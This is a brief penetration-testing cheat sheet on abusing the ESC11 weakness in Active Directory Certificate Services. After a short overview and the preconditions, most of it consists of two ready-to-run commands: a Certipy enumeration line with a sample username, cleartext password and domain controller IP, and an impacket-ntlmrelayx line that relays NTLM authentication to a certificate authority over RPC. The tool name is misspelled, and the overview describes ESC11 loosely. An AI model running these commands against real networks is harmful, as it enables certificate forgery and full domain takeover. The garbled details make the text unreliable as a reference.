# General Overview: 

Exploiting ESC11 in AD CS involves abusing certificate templates that allow enrollment for certificates with insufficient security controls, enabling attackers to forge certificates that can impersonate privileged accounts. This can lead to unauthorized access and potential full domain compromise, especially when combined with weak certificate validation or mapping practices.

## Requirements:

- Enforce Encryption for Requests: Disabled
- Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

# Abusing ESC11  Certificate Templates

## Certipy:
- cetipy-ad find -username afsimmons@megacorpone.com -p Spawn123! -dc-ip 172.21.1.5 -stdout
- impacket-ntlmrelayx -t rpc://172.21.1.100 -rpc-mode ICPR -icpr-ca-name megacorp-DC-CA -smb2support